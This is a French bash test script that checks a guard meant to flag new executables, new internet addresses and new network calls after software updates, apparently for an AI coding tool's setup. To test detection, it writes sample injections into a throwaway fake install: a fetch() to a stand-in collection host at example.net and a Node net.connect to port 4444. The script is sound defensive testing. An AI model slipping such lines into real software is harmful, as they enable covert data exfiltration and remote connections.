#!/usr/bin/env bash
# test-garde-mises-a-jour.sh — LA PREUVE du garde des mises à jour.
#
# Demande de Patrick (21/08) : « un garde-fou sur les mises à jour d'opencode
# et les tiennes ; il vérifie qu'aucun binaire ni communication réseau n'a été
# ajouté ». Une mise à jour est le moment idéal pour glisser quelque chose :
# le fichier change, personne ne regarde, et l'outil a déjà toutes les
# permissions.
#
# Le garde prend une EMPREINTE de l'installation (chaque fichier, chaque
# programme exécutable, chaque adresse internet écrite dans le code). À la
# mise à jour suivante, il compare et CRIE sur ce qui est apparu.
#
# Ce banc fabrique une fausse installation dont on connaît la vérité, puis
# vérifie que le garde voit ce qu'on y glisse.
#
# Usage : bash ~/.claude/gates/test-garde-mises-a-jour.sh  (code 0 = tout vert)
set -u
GARDE="${GATES_HOME:-$HOME/.claude}/gates/garde-mises-a-jour.py"
fails=0
vert(){ echo "  VERT  $*"; }
rouge(){ echo "  ROUGE $*"; fails=$((fails+1)); }

if [ ! -f "$GARDE" ]; then
  echo "ROUGE TOTAL : $GARDE n'existe pas encore — le garde n'est pas posé."
  exit 99
fi

BAC="$(mktemp -d -t bac-maj.XXXXXXXX)"
trap 'rm -rf "$BAC"' EXIT
FAUX="$BAC/outil"; mkdir -p "$FAUX/lib"
EMPREINTES="$BAC/empreintes"

# une installation de départ : du code sage, une seule adresse connue
cat > "$FAUX/index.js" <<'JS'
const API = "https://api.exemple.fr/v1";
function saluer(nom){ return "bonjour " + nom; }
JS
printf 'texte sans danger\n' > "$FAUX/lib/notes.txt"

lance(){ python3 "$GARDE" --racine "$FAUX" --empreintes "$EMPREINTES" --nom bac 2>&1; }

echo "=== 1. première fois : le garde apprend, il ne crie pas ==="
S="$(lance)"
case "$S" in (*"EMPREINTE POSEE"*) vert "première prise d'empreinte";;
             (*) rouge "première prise d'empreinte ratée : $S";; esac

echo "=== 2. rien n'a bougé : silence ==="
S="$(lance)"
case "$S" in (*"AUCUN CHANGEMENT"*) vert "installation inchangée : rien à signaler";;
             (*) rouge "il crie alors que rien n'a change : $S";; esac

echo "=== 3. un programme exécutable ajouté : ALERTE ==="
printf '\177ELF\2\1\1\0 faux programme' > "$FAUX/lib/outil-cache"
chmod +x "$FAUX/lib/outil-cache"
S="$(lance)"
case "$S" in (*"PROGRAMME AJOUTE"*outil-cache*) vert "programme exécutable repéré";;
             (*) rouge "il n'a pas vu le programme ajouté : $S";; esac

echo "=== 4. une nouvelle adresse internet : ALERTE ==="
printf 'fetch("https://collecte-inconnue.example.net/envoi");\n' >> "$FAUX/index.js"
S="$(lance)"
case "$S" in (*"ADRESSE AJOUTEE"*collecte-inconnue*) vert "nouvelle adresse internet repérée";;
             (*) rouge "il n'a pas vu la nouvelle adresse : $S";; esac

echo "=== 5. un moyen d'appeler le réseau ajouté : ALERTE ==="
printf 'const net = require("net"); net.connect(4444);\n' >> "$FAUX/index.js"
S="$(lance)"
case "$S" in (*"MOYEN RESEAU AJOUTE"*) vert "nouveau moyen d'appeler le réseau repéré";;
             (*) rouge "il n'a pas vu le nouveau moyen réseau : $S";; esac

echo "=== 6. l'adresse déjà connue ne doit PAS crier ==="
S="$(lance)"
case "$S" in (*api.exemple.fr*) rouge "il crie sur une adresse déjà connue";;
             (*) vert "adresse déjà connue : pas de fausse alerte";; esac

echo "=== 7. installation absente : il le dit, il ne plante pas ==="
S="$(python3 "$GARDE" --racine "$BAC/nulle-part" --empreintes "$EMPREINTES" --nom fantome 2>&1)"
case "$S" in (*"INTROUVABLE"*) vert "installation absente : dit proprement";;
             (*) rouge "reponse inattendue sur une installation absente : $S";; esac

echo "----------------------------------------"
[ $fails -eq 0 ] && echo "GARDE DES MISES A JOUR PROUVE (tout vert)" || echo "$fails echec(s)"
exit $fails
